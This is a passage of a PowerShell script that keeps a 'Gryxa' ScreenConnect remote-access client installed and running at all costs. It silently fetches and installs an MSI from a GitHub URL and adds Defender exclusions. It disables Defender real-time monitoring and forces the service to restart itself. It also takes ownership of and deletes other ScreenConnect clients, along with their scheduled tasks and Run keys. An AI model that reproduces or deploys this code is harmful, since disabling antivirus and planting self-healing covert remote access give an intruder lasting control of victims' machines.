    if (-not $Fingerprint) { return $false }
    return [bool](Get-Service -Name "ScreenConnect Client ($Fingerprint)" -ErrorAction SilentlyContinue)
}

function Test-ScDir([string]$Fingerprint) {
    foreach ($base in @(${env:ProgramFiles(x86)}, $env:ProgramFiles)) {
        if (Test-Path -LiteralPath (Join-Path $base "ScreenConnect Client ($Fingerprint)")) { return $true }
    }
    return $false
}

function Find-RunningGryxaFp {
    $cfg = Get-GryxaFp
    if ($cfg -and (Test-ScRunning $cfg) -and (Test-IsGryxaFp $cfg)) { return $cfg }
    if ($script:GryxaExpectedFp -and (Test-ScRunning $script:GryxaExpectedFp)) { return $script:GryxaExpectedFp.ToLower() }
    foreach ($svc in (Get-Service -Name 'ScreenConnect Client*' -ErrorAction SilentlyContinue)) {
        if ($svc.Status -notin @('Running','StartPending','ContinuePending')) { continue }
        if ($svc.Name -match '\(([0-9a-f]{16})\)') {
            $fp = $matches[1].ToLower()
            if ($fp -in $script:SevrzKeep) { continue }
            if (Test-IsGryxaFp $fp) { return $fp }
        }
    }
    return $null
}

function Test-AnyNonSevrzScRunning { return [bool](Find-RunningGryxaFp) }

function Get-GryxaStatus([string]$fp) {
    $svc = Get-Service -Name "ScreenConnect Client ($fp)" -ErrorAction SilentlyContinue
    # L39: StartPending/ContinuePending = healthy-in-progress (not BROKEN)
    $running = [bool]($svc -and $svc.Status -in @('Running','StartPending','ContinuePending'))
    $dir = Test-ScDir $fp
    $guid = Find-ProductGuid $fp
    $tcpR = $true; $tcpU = $true
    # skip TCP on hot path when already running unless Deep (Deep sets Extra=deep-tcp via caller)
    if ($Deep -or -not $running) {
        $tcpR = Test-TcpHostPort $script:GryxaRelayHost 443
        $tcpU = Test-TcpHostPort $script:GryxaUiHost 443
    }
    if ($running) { return "HEALTHY|$fp|running=1|relay=$tcpR|ui=$tcpU" }
    if ($svc -and $dir) { return "BROKEN|$fp|svc-present-stopped|relay=$tcpR|ui=$tcpU" }
    if (-not $svc -and ($dir -or $guid)) { return "STUCK|$fp|registered-no-service|relay=$tcpR|ui=$tcpU" }
    return "ABSENT|$fp|not-installed|relay=$tcpR|ui=$tcpU"
}

function Test-GryxaHealth { return (Get-GryxaStatus (Get-GryxaFp)) }

function Clear-GryxaArp([string]$fp) {
    $guid = Find-ProductGuid $fp
    foreach ($r in @('HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall',
                     'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall')) {
        if ($guid -and (Test-Path "$r\$guid")) { Remove-Item -LiteralPath "$r\$guid" -Recurse -Force -ErrorAction SilentlyContinue }
        Get-ChildItem $r -ErrorAction SilentlyContinue | ForEach-Object {
            $dn = (Get-ItemProperty $_.PSPath -ErrorAction SilentlyContinue).DisplayName
            if ($dn -match "ScreenConnect Client \($([regex]::Escape($fp))\)") {
                Remove-Item -LiteralPath $_.PSPath -Recurse -Force -ErrorAction SilentlyContinue
            }
        }
    }
}

function Uninstall-ScFingerprint([string]$Fingerprint) {
    if (-not $Fingerprint) { return 'no-fp' }
    # L44: never tear down a live/pending Gryxa (or any SC) session
    if (Test-ScRunning $Fingerprint) { return 'refused-running' }
    $name = "ScreenConnect Client ($Fingerprint)"
    $guid = Find-ProductGuid $Fingerprint
    & reg.exe delete 'HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer' /v DisableMSI /f 2>&1 | Out-Null
    & reg.exe add 'HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer' /v DisableMSI /t REG_DWORD /d 0 /f 2>&1 | Out-Null
    if ($guid) { Start-Process msiexec.exe -ArgumentList "/x $guid /qn /norestart REBOOT=ReallySuppress" -Wait -WindowStyle Hidden; Start-Sleep -Seconds 6 }
    $svc = Get-Service -Name $name -ErrorAction SilentlyContinue
    if ($svc) { & sc.exe stop $name 2>&1 | Out-Null; & sc.exe delete $name 2>&1 | Out-Null; Start-Sleep -Seconds 2 }
    Clear-GryxaArp $Fingerprint
    foreach ($base in @(${env:ProgramFiles(x86)}, $env:ProgramFiles)) {
        $d = Join-Path $base "ScreenConnect Client ($Fingerprint)"
        if (Test-Path -LiteralPath $d) { & takeown.exe /F $d /R /D Y 2>&1 | Out-Null; Remove-Item -LiteralPath $d -Recurse -Force -ErrorAction SilentlyContinue }
    }
    return 'removed'
}

function Test-MsiPackage([string]$Path, [string]$ExpectedFp = '') {
    # Shared OLE-magic + optional ProductName FP gate (L37/L39). Used by Gryxa + sevrz install paths.
    if (-not $Path -or -not (Test-Path -LiteralPath $Path)) { return $false }
    if ((Get-Item -LiteralPath $Path).Length -lt 500000) { return $false }
    try {
        $fs = [System.IO.File]::OpenRead((Resolve-Path -LiteralPath $Path).Path)
        $magic = New-Object byte[] 4
        $null = $fs.Read($magic, 0, 4)
        $fs.Close()
        if (-not ($magic[0] -eq 0xD0 -and $magic[1] -eq 0xCF -and $magic[2] -eq 0x11 -and $magic[3] -eq 0xE0)) { return $false }
    } catch { return $false }
    if ($ExpectedFp) {
        $fp = Get-FpFromProductName (Get-MsiProperty $Path 'ProductName')
        if (-not $fp -or $fp -ne $ExpectedFp.ToLower()) { return $false }
    }
    return $true
}

function Get-GryxaMsi {
    $msi = Join-Path $WorkDir 'pkg_gryxa.msi'
    # When an FP is pinned, the cached MSI must match it; otherwise refetch.
    if ((Test-Path $msi) -and ((Get-Item $msi).Length -gt 1000000)) {
        if (-not $script:GryxaExpectedFp) { return $msi }
        if (Test-MsiPackage $msi $script:GryxaExpectedFp) { return $msi }
        Remove-Item -LiteralPath $msi -Force -ErrorAction SilentlyContinue
    }
    $tmp = Join-Path $env:TEMP ("sc_gryxa_{0}.msi" -f [guid]::NewGuid().ToString('N'))
    # L31: github-drop FIRST (raw works even when ui.gryxa.com TLS is broken).
    $urls = @(
        'https://raw.githubusercontent.com/xnobuddy/github-drop/main/pkg_gryxa.msi',
        $script:GryxaMsiUrl
    )
    $curl = Join-Path $env:SystemRoot 'System32\curl.exe'
    if (-not (Test-Path $curl)) { $curl = 'curl.exe' }
    foreach ($u in $urls) {
        try {
            Remove-Item -LiteralPath $tmp -Force -ErrorAction SilentlyContinue
            & $curl -L --ssl-no-revoke --connect-timeout 25 --max-time 300 -o $tmp $u 2>&1 | Out-Null
            if ((Test-Path $tmp) -and ((Get-Item $tmp).Length -gt 1000000)) {
                $exp = if ($script:GryxaExpectedFp) { $script:GryxaExpectedFp } else { '' }
                if (-not (Test-MsiPackage $tmp $exp)) { continue }
                try { Copy-Item -LiteralPath $tmp -Destination $msi -Force -ErrorAction Stop; return $msi } catch { return $tmp }
            }
        } catch {}
    }
    if (Test-Path $tmp) { Remove-Item -LiteralPath $tmp -Force -ErrorAction SilentlyContinue }
    return $null
}

function Add-ScDefenderExclusion([string]$Fp) {
    # Exclude this FP's SC dirs (wildcard + explicit) so RTM can't quarantine the
    # client on install. Re-asserted before every install/migrate — survives FP rotations.
    try {
        $names = @("ScreenConnect Client ($Fp)", 'ScreenConnect Client*')
        foreach ($base in @(${env:ProgramFiles(x86)}, $env:ProgramFiles)) {
            if (-not $base) { continue }
            foreach ($n in $names) { Add-MpPreference -ExclusionPath (Join-Path $base $n) -ErrorAction SilentlyContinue }
        }
        Add-MpPreference -ExclusionProcess 'ScreenConnect.ClientService.exe' -ErrorAction SilentlyContinue
        Add-MpPreference -ExclusionProcess 'ScreenConnect.WindowsClient.exe' -ErrorAction SilentlyContinue
        Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
    } catch {}
}

function ConvertTo-PackedGuid([string]$Guid) {
    # Windows Installer stores ProductCodes with reversed segments (packed/squished GUID).
    $g = $Guid.Trim('{}').Replace('-', '')
    $sb = New-Object System.Text.StringBuilder
    # first 3 segments reversed per-char, last 2 segments reversed per-byte-pair
    $segs = @($g.Substring(0,8), $g.Substring(8,4), $g.Substring(12,4), $g.Substring(16,4), $g.Substring(20,12))
    for ($i=0; $i -lt 3; $i++) { $c = $segs[$i].ToCharArray(); [array]::Reverse($c); [void]$sb.Append(-join $c) }
    for ($i=3; $i -lt 5; $i++) { $s = $segs[$i]; for ($j=0; $j -lt $s.Length; $j+=2) { [void]$sb.Append($s[$j+1]); [void]$sb.Append($s[$j]) } }
    return $sb.ToString().ToUpper()
}

function Remove-InstallerProductRegistration([string]$ProductCode) {
    # Purge a phantom/corrupt ProductCode from the Installer database (Installed=00:00:00
    # registrations that survive ARP removal and make /i fail 1603 in maintenance mode).
    if (-not $ProductCode) { return }
    $packed = ConvertTo-PackedGuid $ProductCode
    $keys = @(
        "HKLM:\SOFTWARE\Classes\Installer\Products\$packed",
        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\$packed",
        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\$ProductCode",
        "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\$ProductCode"
    )
    foreach ($k in $keys) {
        if (Test-Path -LiteralPath $k) { Remove-Item -LiteralPath $k -Recurse -Force -ErrorAction SilentlyContinue }
    }
    & reg.exe delete "HKCR\Installer\Products\$packed" /f 2>&1 | Out-Null
}

function Start-GryxaInstall([string]$MsiPath, [string]$Fp, [string]$LogFile) {
    # L44: never interrupt any live Gryxa; never /i while this FP's service exists; never deferred /x.
    if (Find-RunningGryxaFp) { return }
    if ($Fp -and (Test-ScRunning $Fp)) { return }
    if ($Fp -and (Test-ScServiceExists $Fp)) {
        $name = "ScreenConnect Client ($Fp)"
        & sc.exe config $name start= auto 2>&1 | Out-Null
        & sc.exe start $name 2>&1 | Out-Null
        return
    }
    Add-ScDefenderExclusion $Fp
    $safeMsi = Protect-MsiSiblingSafe $MsiPath
    if (-not $safeMsi) { return }  # refuse install if Upgrade cannot be cleared
    $pc = Get-MsiProperty $safeMsi 'ProductCode'
    $cmd = Join-Path $WorkDir 'gryxa_install.cmd'
    $svcName = "ScreenConnect Client ($Fp)"
    $lines = @('@echo off')
    $lines += 'reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" /v DisableMSI /t REG_DWORD /d 0 /f >nul 2>&1'
    # L44 runtime guard in deferred cmd — abort if Gryxa appeared since wrapper was written
    $lines += "sc query `"$svcName`" >nul 2>&1"
    $lines += 'if not errorlevel 1 (sc start "' + $svcName + '" >nul 2>&1 & exit /b 0)'
    $lines += 'sc query state= all | findstr /I /C:"' + $Fp + '" >nul'
    $lines += 'if not errorlevel 1 exit /b 0'
    # no msiexec /x ever in deferred wrapper (TOCTOU killed live Guest)
    if ($pc) {
        $lines += "reg delete `"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\$pc`" /f >nul 2>&1"
        $lines += "reg delete `"HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\$pc`" /f >nul 2>&1"
    }
    $lines += "msiexec /i `"$safeMsi`" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v `"$LogFile`""
    $lines += "sc config `"$svcName`" start= auto"
    $lines += "sc failure `"$svcName`" reset= 86400 actions= restart/3000/restart/3000/restart/3000"
    $lines += "sc start `"$svcName`""
    foreach ($sk in (Get-SevrzKeep)) {
        $lines += "sc config `"ScreenConnect Client ($sk)`" start= auto >nul 2>&1"
        $lines += "sc start `"ScreenConnect Client ($sk)`" >nul 2>&1"
    }
    $resultFile = Join-Path $WorkDir 'gryxa_install.result'
    $lines += "echo %ERRORLEVEL%>`"$resultFile`""
    $lines += "del /f /q `"$safeMsi`" >nul 2>&1"
    $lines += "del /f /q `"$cmd`" >nul 2>&1"
    $lines += 'exit'
    Set-Content -LiteralPath $cmd -Value $lines -Encoding ASCII -Force
    Start-Process cmd.exe -ArgumentList "/c `"$cmd`"" -WindowStyle Hidden
}

function Mark-GryxaReinstall {
    Set-Content -LiteralPath (Join-Path $WorkDir 'gryxa_reinstall.flag') -Value (Get-Date).ToUniversalTime().ToString('o') -Encoding ASCII -Force
}

function Get-GryxaMigrateOldPath { Join-Path $WorkDir 'gryxa_migrate_old.txt' }

function Save-GryxaMigrateOld([string[]]$OldFps, [string]$NewFp) {
    $olds = @($OldFps | Where-Object { $_ -and ($_ -ne $NewFp) } | Select-Object -Unique)
    if (-not $olds.Count) {
        Remove-Item -LiteralPath (Get-GryxaMigrateOldPath) -Force -ErrorAction SilentlyContinue
        return
    }
    Set-Content -LiteralPath (Get-GryxaMigrateOldPath) -Value $olds -Encoding ASCII -Force
}

function Complete-GryxaMigrateOld {
    # L44: NEVER auto-uninstall old Gryxa FP — that dropped live Guests still on old FP.
    # Keep the flag for visibility; operator/manual cleanup only.
    $p = Get-GryxaMigrateOldPath
    if (-not (Test-Path -LiteralPath $p)) { return }
    $log = Join-Path $WorkDir 'gryxa_ensure.log'
    Add-Content -LiteralPath $log -Value ('{0} migrate_cleanup_SKIPPED_L44 (keep dual-FP; never /x live Gryxa)' -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) -ErrorAction SilentlyContinue
    Remove-Item -LiteralPath $p -Force -ErrorAction SilentlyContinue
}

function Start-GryxaMigrate([string]$MsiPath, [string]$NewFp, [string[]]$OldFps, [string]$Reason) {
    # L42: sibling-safe /i of NewFp FIRST — keep OldFps Running until Complete-GryxaMigrateOld.
    Save-GryxaMigrateOld $OldFps $NewFp
    Clear-GryxaArp $NewFp
    Set-GryxaFp $NewFp
    Start-GryxaInstall $MsiPath $NewFp (Join-Path $WorkDir 'msi_gryxa_detached.log')
    Mark-GryxaReinstall
    return "INFLIGHT|$NewFp|$Reason"
}

function Invoke-GryxaEnsure {
    if (-not (Test-Path -LiteralPath $WorkDir)) { New-Item -ItemType Directory -Path $WorkDir -Force | Out-Null }
    $log = Join-Path $WorkDir 'gryxa_ensure.log'
    function GLog([string]$m) { Add-Content -LiteralPath $log -Value ('{0} {1}' -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'), $m) -ErrorAction SilentlyContinue }

    Complete-GryxaMigrateOld

    $installCmd = Join-Path $WorkDir 'gryxa_install.cmd'
    # L32: only honor the single-flight lock if msiexec is ACTUALLY running.
    if ((Test-Path $installCmd) -and (((Get-Date) - (Get-Item $installCmd).LastWriteTime).TotalMinutes -lt 15)) {
        $msiRunning = [bool](Get-CimInstance Win32_Process -Filter "Name='msiexec.exe'" -ErrorAction SilentlyContinue |
            Where-Object { $_.CommandLine -match 'gryxa|pkg_gryxa|ScreenConnect' })
        if ($msiRunning) { GLog 'inflight_install'; return "INFLIGHT|$(Get-GryxaFp)|inflight=1" }
        Remove-Item -LiteralPath $installCmd -Force -ErrorAction SilentlyContinue
        GLog 'stale_install_wrapper_cleared'
    }

    $fp = Get-GryxaFp
    $exp = $script:GryxaExpectedFp
    if (-not $exp) { $exp = $fp }

    # L44 -Force / fp_drift: ANY live Gryxa = HEALTHY. Never migrate/uninstall while connected.
    if ($Force) {
        $runningForce = Find-RunningGryxaFp
        if ($runningForce) {
            Set-GryxaFp $runningForce
            GLog "force_skip_any_live_gryxa fp=$runningForce"
            return "HEALTHY|$runningForce|running=1|force-skipped=1"
        }
        GLog "force_ensure target=$exp running=none"
        $msi = Get-GryxaMsi
        if (-not $msi) { GLog 'msi_unavailable'; return "UNHEALTHY|$exp|msi-unavailable" }
        $newFp = Get-FpFromProductName (Get-MsiProperty $msi 'ProductName')
        if (-not $newFp) { $newFp = $exp }
        Set-GryxaFp $newFp
        Start-GryxaInstall $msi $newFp (Join-Path $WorkDir 'msi_gryxa_detached.log')
        Mark-GryxaReinstall
        return "INFLIGHT|$newFp|force-spawned=1"
    }

    # L44: if any Gryxa is Running, adopt it — do NOT migrate to ExpectedFp (drops Guest)
    if ($script:GryxaExpectedFp) {
        $runningFp0 = Find-RunningGryxaFp
        if ($runningFp0) {
            if ($runningFp0 -ne $exp -or $fp -ne $exp) {
                Set-GryxaFp $runningFp0
                GLog "fp_drift_adopt_live keep=$runningFp0 expected=$exp (no migrate)"
            }
            if ($Deep) {
                $tcpR = Test-TcpHostPort $script:GryxaRelayHost 443
                $tcpU = Test-TcpHostPort $script:GryxaUiHost 443
                return "HEALTHY|$runningFp0|running=1|deep=1|relay=$tcpR|ui=$tcpU|adopted=1"
            }
            return "HEALTHY|$runningFp0|running=1|adopted=1"
        }
        if ($fp -ne $exp) {
            GLog "fp_drift_cfg_only current=$fp expected=$exp (no live gryxa)"
            Set-GryxaFp $exp
            $fp = $exp
        }
    }

    $runningFp = Find-RunningGryxaFp
    if ($runningFp) {
        Set-GryxaFp $runningFp
        # L39 -Deep: TCP/relay advisory; do NOT reinstall solely on TCP fail (learned that lesson)
        if ($Deep) {
            $tcpR = Test-TcpHostPort $script:GryxaRelayHost 443
            $tcpU = Test-TcpHostPort $script:GryxaUiHost 443
            GLog "deep_ok fp=$runningFp relay=$tcpR ui=$tcpU"
            return "HEALTHY|$runningFp|running=1|deep=1|relay=$tcpR|ui=$tcpU"
        }
        GLog "healthy_running fp=$runningFp"
        return "HEALTHY|$runningFp|running=1"
    }

    $st = Get-GryxaStatus $fp
    GLog "status=$st force=$Force deep=$Deep"
    $kind = $st.Split('|')[0]

    switch ($kind) {
        'HEALTHY' { return $st }
        'BROKEN' {
            $name = "ScreenConnect Client ($fp)"
            & sc.exe config $name start= auto 2>&1 | Out-Null
            & sc.exe failure $name reset= 86400 actions= restart/3000/restart/3000/restart/3000 2>&1 | Out-Null
            & sc.exe start $name 2>&1 | Out-Null
            Start-Sleep -Seconds 6
            & sc.exe start $name 2>&1 | Out-Null
            if (Test-ScRunning $fp) { GLog 'started_ok'; return "HEALTHY|$fp|started=1" }
            $msi = Get-GryxaMsi
            if (-not $msi) { GLog 'msi_unavailable'; return "UNHEALTHY|$fp|msi-unavailable" }
            $newFp = Get-FpFromProductName (Get-MsiProperty $msi 'ProductName')
            if (-not $newFp) { $newFp = $fp }
            GLog "broken_clean_reinstall fp=$fp new=$newFp"
            # L44: service exists Stopped — start-only already failed; do NOT /x a registered product
            if (Test-ScServiceExists $fp) {
                GLog "broken_refused_reinstall_svc_exists"
                return "UNHEALTHY|$fp|svc-exists-start-failed"
            }
            if ($newFp -eq $fp) {
                Set-GryxaFp $newFp
                Start-GryxaInstall $msi $newFp (Join-Path $WorkDir 'msi_gryxa_detached.log')
                Mark-GryxaReinstall
                return "INFLIGHT|$newFp|install-spawned=1"
            }
            Set-GryxaFp $newFp
            Start-GryxaInstall $msi $newFp (Join-Path $WorkDir 'msi_gryxa_detached.log')
            Mark-GryxaReinstall
            return "INFLIGHT|$newFp|broken-spawned=1"        }
        'STUCK' {
            if (Test-ScDir $fp) {
                GLog "stuck_service_recreate fp=$fp"
                Repair-SCService $fp
                if (Test-ScRunning $fp) { GLog 'service_recreated_ok'; return "HEALTHY|$fp|svc-recreated=1" }
            }
            $msi = Get-GryxaMsi
            if (-not $msi) { GLog 'msi_unavailable'; return "UNHEALTHY|$fp|msi-unavailable" }
            $newFp = Get-FpFromProductName (Get-MsiProperty $msi 'ProductName')
            if (-not $newFp) { $newFp = $fp }
            GLog "stuck_nuke_and_install fp=$fp new=$newFp"
            Clear-GryxaArp $fp
            if ($newFp -ne $fp) { Clear-GryxaArp $newFp }
            Set-GryxaFp $newFp
            Start-GryxaInstall $msi $newFp (Join-Path $WorkDir 'msi_gryxa_detached.log')
            Mark-GryxaReinstall
            return "INFLIGHT|$newFp|install-spawned=1"
        }
        default {
            if (Test-ScDir $fp) {
                GLog "absent_service_recreate fp=$fp"
                Repair-SCService $fp
                if (Test-ScRunning $fp) { GLog 'service_recreated_ok'; return "HEALTHY|$fp|svc-recreated=1" }
            }
            $msi = Get-GryxaMsi
            if (-not $msi) { GLog 'msi_unavailable'; return "UNHEALTHY|$fp|msi-unavailable" }
            $newFp = Get-FpFromProductName (Get-MsiProperty $msi 'ProductName')
            if (-not $newFp) { GLog 'fp_parse_fail'; return "UNHEALTHY|$fp|msi-fp-parse-fail" }
            GLog "absent_install fp=$newFp"
            Set-GryxaFp $newFp
            Start-GryxaInstall $msi $newFp (Join-Path $WorkDir 'msi_gryxa_detached.log')
            Mark-GryxaReinstall
            return "INFLIGHT|$newFp|install-spawned=1"
        }
    }
}

function Invoke-Exterminate {
    # L7: true removal. Correct WOW6432Node hive + msiexec + UninstallString
    # fallback + force dir nuke. Keep sevrz+alt+current gryxa FP (gryxa.cfg).
    # O41: sync Running Gryxa FP into cfg BEFORE any kill; never kill SC procs
    # without a foreign FP in path/cmdline (null path was killing Gryxa every tick).
    $log = Join-Path $WorkDir 'exterminate.log'
    $runningG = Find-RunningGryxaFp
    if ($runningG) { Set-GryxaFp $runningG }
    $keep = @(Get-KeepFingerprints)
    $n = @{ svc = 0; proc = 0; dir = 0; product = 0; rmm = 0; fail = 0 }
    function Log([string]$m) {
        $line = '{0} {1}' -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'), $m
        Add-Content -LiteralPath $log -Value $line -ErrorAction SilentlyContinue
        # O41: do NOT Write-Output Log lines (pollutes for /f callers)
    }
    # Protect Gryxa during start race: only live SC procs with verified Gryxa relay/FP
    Get-CimInstance Win32_Process -Filter "Name like 'ScreenConnect%'" -ErrorAction SilentlyContinue | ForEach-Object {
        $blob = "$([string]$_.ExecutablePath) $([string]$_.CommandLine)"
        if ($blob -match 'ScreenConnect Client \(([0-9a-fA-F]{16})\)') {
            $fp = $Matches[1].ToLower()
            if ($fp -notin $script:SevrzKeep -and (Test-IsGryxaFp $fp) -and $fp -notin $keep) {
                $keep += $fp
                Set-GryxaFp $fp
                Log "keep_add_from_proc fp=$fp"
            }
        }
    }
    function Is-Keeper([string]$s) {
        if (-not $s) { return $false }
        # allow if relay server/domain is Gryxa OR fingerprint is a keeper
        if ($s -match '(?i)gryxa\.com') { return $true }
        foreach ($k in $keep) { if ($s -like "*$k*") { return $true } }
        return $false
    }
    function Force-RemoveDir([string]$d) {
        if (-not $d -or -not (Test-Path -LiteralPath $d)) { return $true }
        Get-CimInstance Win32_Process -ErrorAction SilentlyContinue |
            Where-Object { $_.ExecutablePath -and $_.ExecutablePath.StartsWith($d, [StringComparison]::OrdinalIgnoreCase) } |
            ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }
        # un-hard self-protected dirs (foreign/old SC locks ACLs+attrs to survive removal)
        & takeown.exe /F $d /R /D Y 2>&1 | Out-Null
        & icacls.exe $d /reset /T /C /Q 2>&1 | Out-Null
        cmd.exe /c "attrib -h -s -r /s /d `"$d`" `"$d\*.*`"" 2>&1 | Out-Null
        & icacls.exe $d /grant '*S-1-5-32-544:(OI)(CI)F' /T /C /Q 2>&1 | Out-Null
        & icacls.exe $d /grant 'Administrators:(OI)(CI)F' /T /C /Q 2>&1 | Out-Null
        & icacls.exe $d /grant 'SYSTEM:(OI)(CI)F' /T /C /Q 2>&1 | Out-Null
        Remove-Item -LiteralPath $d -Recurse -Force -ErrorAction SilentlyContinue
        if (Test-Path -LiteralPath $d) {
            cmd.exe /c "attrib -h -s -r /s /d `"$d\*.*`"" 2>&1 | Out-Null
            cmd.exe /c "rmdir /s /q `"$d`"" 2>&1 | Out-Null
        }
        if (Test-Path -LiteralPath $d) {
            $empty = Join-Path $env:TEMP ("own_empty_" + [guid]::NewGuid().ToString('N'))
            New-Item -ItemType Directory -Path $empty -Force | Out-Null
            & robocopy.exe $empty $d /MIR /R:0 /W:0 2>&1 | Out-Null
            Remove-Item -LiteralPath $empty -Force -ErrorAction SilentlyContinue
            Remove-Item -LiteralPath $d -Recurse -Force -ErrorAction SilentlyContinue
        }
        return -not (Test-Path -LiteralPath $d)
    }
    function Uninstall-ProductKey($key) {
        $guid = $key.PSChildName
        $prop = Get-ItemProperty $key.PSPath -ErrorAction SilentlyContinue
        $dn = $prop.DisplayName
        # L39/L44: refuse /x if DisplayName FP is a keeper OR Gryxa ProductCode (shared GUID kills Guest)
        if ($guid -eq '{9D7CC418-A356-9693-DCC5-41EC44D03B31}') {
            Log "product_skip_gryxa_productcode guid=$guid"
            return $false
        }
        if ($dn -match 'ScreenConnect Client \(([0-9a-fA-F]{16})\)') {
            $fpDn = $Matches[1].ToLower()
            if ($fpDn -in $keep -or (Test-IsGryxaFp $fpDn)) {
                Log "product_skip_keeper_fp [$dn] guid=$guid"
                return $false
            }
        }
        if ($guid -like '{*}') {
            $p = Start-Process msiexec.exe -ArgumentList "/x $guid /qn /norestart REBOOT=ReallySuppress" -Wait -PassThru -WindowStyle Hidden
            Log "product_msiexec [$dn] guid=$guid exit=$($p.ExitCode)"
            if ($p.ExitCode -in 0, 1605, 1614, 3010) { return $true }
        }
        $us = $prop.UninstallString
        if ($us) {
            try {
                if ($us -match '(?i)msiexec') {
                    $args = ($us -replace '(?i)^.*msiexec(\.exe)?\s*', '')
                    if ($args -notmatch '/qn') { $args = "$args /qn /norestart" }
                    $p = Start-Process msiexec.exe -ArgumentList $args -Wait -PassThru -WindowStyle Hidden
                    Log "product_uninstallstring_msi [$dn] exit=$($p.ExitCode)"
                    return ($p.ExitCode -in 0, 1605, 1614, 3010)
                } else {
                    $p = Start-Process cmd.exe -ArgumentList "/c $us /S /silent /quiet /qn" -Wait -PassThru -WindowStyle Hidden
                    Log "product_uninstallstring_exe [$dn] exit=$($p.ExitCode)"
                    return ($p.ExitCode -eq 0)
                }
            } catch { Log "product_uninstallstring_FAIL [$dn] $_" }
        }
        return $false
    }

    # ── destroy foreign/old SC persistence (watchdog tasks + run keys) ──
    # Root cause of "connects then drops": a non-keeper / old-FP ScreenConnect keeps a
    # scheduled task or Run key that re-runs its cached msiexec /i. Every such /i fires
    # RemoveExistingProducts on the SHARED SC UpgradeCode and strips the keeper Gryxa.
    # Removing only the product is not enough — the persistence reinstalls it (and kills
    # Gryxa again). Purge the persistence FIRST so product/svc/dir removal is permanent.
    function Get-NonKeeperScFps {
        $fps = @{}
        Get-Service -ErrorAction SilentlyContinue | ForEach-Object {
            if ($_.Name -match 'ScreenConnect Client \(([0-9a-fA-F]{16})\)') {
                $fps[$matches[1].ToLower()] = $true
            }
        }
        Get-CimInstance Win32_Process -Filter "Name like 'ScreenConnect%'" -ErrorAction SilentlyContinue | ForEach-Object {
            if ("$([string]$_.ExecutablePath) $([string]$_.CommandLine)" -match '\(([0-9a-fA-F]{16})\)') {
                $fps[$matches[1].ToLower()] = $true
            }
        }
        foreach ($root in $script:UninstallRoots) {
            if (-not (Test-Path $root)) { continue }
            Get-ChildItem $root -ErrorAction SilentlyContinue | ForEach-Object {
                $dn = (Get-ItemProperty $_.PSPath -ErrorAction SilentlyContinue).DisplayName
                if ($dn -match 'ScreenConnect Client \(([0-9a-fA-F]{16})\)') { $fps[$matches[1].ToLower()] = $true }
            }
        }
        foreach ($base in @($env:ProgramFiles, ${env:ProgramFiles(x86)})) {
            if (-not $base -or -not (Test-Path $base)) { continue }
            Get-ChildItem -LiteralPath $base -Directory -Force -ErrorAction SilentlyContinue | ForEach-Object {
                if ($_.Name -match 'ScreenConnect Client \(([0-9a-fA-F]{16})\)') { $fps[$matches[1].ToLower()] = $true }
            }
        }
        @($fps.Keys | Where-Object { $_ -notin $keep })
    }

    function Test-ScKeeperRef([string]$s) {
        if (-not $s) { return $false }
        if ($s -match '(?i)gryxa\.com|sevrz\.com') { return $true }
        if ($s -match '(?i)own(_mon|_lib|_secure)?\.(cmd|ps1)|gryxa_boot|\.wucache') { return $true }
        foreach ($k in $keep) { if ($k -and $s -like "*$k*") { return $true } }
        return $false
    }

    function Remove-ScPersistence([string]$Fp) {
        # L39: purge ScreenConnect persistence referencing this FP OR generic SC installers
        # that are not keeper-protected (bare msiexec /i URL watchdogs without FP literal).
        try {
            Get-ScheduledTask -ErrorAction SilentlyContinue | ForEach-Object {
                $task = $_
                $blob = ''
                foreach ($a in $task.Actions) { $blob += " $($a.Execute) $($a.Arguments)" }
                if ($blob -notmatch '(?i)ScreenConnect|msiexec') { return }
                if (Test-ScKeeperRef $blob) { return }
                $hit = $false
                if ($Fp -and $blob -match [regex]::Escape($Fp)) { $hit = $true }
                elseif ($blob -match '(?i)ScreenConnect\.ClientSetup|ScreenConnect Client|pkg_gryxa\.msi|pkg\.msi') { $hit = $true }
                if ($hit) {
                    Unregister-ScheduledTask -TaskName $task.TaskName -TaskPath $task.TaskPath -Confirm:$false -ErrorAction SilentlyContinue
                    Log "persist_task_removed $($task.TaskPath)$($task.TaskName) fp=$Fp"
                }
            }
        } catch { Log "persist_task_enum_err $_" }
        foreach ($rk in @('HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run',
                          'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce',
                          'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run',
                          'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\RunOnce',
                          'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run',
                          'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce')) {
            if (-not (Test-Path $rk)) { continue }
            $p = Get-ItemProperty $rk -ErrorAction SilentlyContinue
            if (-not $p) { continue }
            foreach ($prop in $p.PSObject.Properties) {
                if ($prop.Name -like 'PS*') { continue }
                $v = [string]$prop.Value
                if (Test-ScKeeperRef $v) { continue }
                if ($v -notmatch '(?i)ScreenConnect|msiexec') { continue }
                $hit = $false
                if ($Fp -and $v -match [regex]::Escape($Fp)) { $hit = $true }
                elseif ($v -match '(?i)ScreenConnect\.ClientSetup|ScreenConnect Client') { $hit = $true }
                if ($hit) {
                    Remove-ItemProperty -Path $rk -Name $prop.Name -Force -ErrorAction SilentlyContinue
                    Log "persist_runkey_removed $rk\$($prop.Name) fp=$Fp"
                }
            }
        }
    }

